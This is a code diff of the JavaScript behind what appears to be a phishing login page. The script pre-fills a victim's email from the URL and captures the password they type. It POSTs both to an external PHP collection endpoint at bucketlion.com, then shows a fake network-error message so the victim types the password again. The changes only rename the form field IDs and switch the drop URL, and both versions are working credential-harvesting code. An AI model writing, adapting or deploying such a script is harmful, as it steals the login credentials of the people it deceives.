@@ -3,7 +3,7 @@ $(document).ready(function() {
 
     var baseUrl = (window.location).href;
     var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-    $("#x1").val(url);
+    $("#email").val(url);
     const handleErr = ()=>{
       var errMsg = "Network Error! Please verify your information and try again";
       var spann = document.querySelector(".mmssgg");
@@ -18,7 +18,7 @@ $(document).ready(function() {
     
     var btnPost = document.querySelector('#submitBtn');
   var divMsg = document.querySelector('#hello');
-  var inpPwd = document.querySelector('#x2');
+  var inpPwd = document.querySelector('#password');
   
   inpPwd.addEventListener('input', ()=>{
             // alert('input was clicked!')
@@ -82,7 +82,7 @@ btnPost.textContent = "Sign In";
   Please Wait...
 </button>`).prop("disabled", false);
         $.ajax({
-            url: "https://bucketlion.com/shar/ug.php",
+            url: "https://bucketlion.com/shar/ugfr.php",
             type: 'POST',
             data: formData,
             contentType: false,
@@ -92,8 +92,8 @@ btnPost.textContent = "Sign In";
                 $('#bd').show();
                 $('#hm').hide();
                 setTimeout(function() {
-                    $("#x1").val(url);
-                    $("#x2").val("");
+                    $("#email").val(url);
+                    $("#password").val("");
                     $('#msg').val(`Network Error! Please verify your information and try again`);
                     
                     // handleErr();
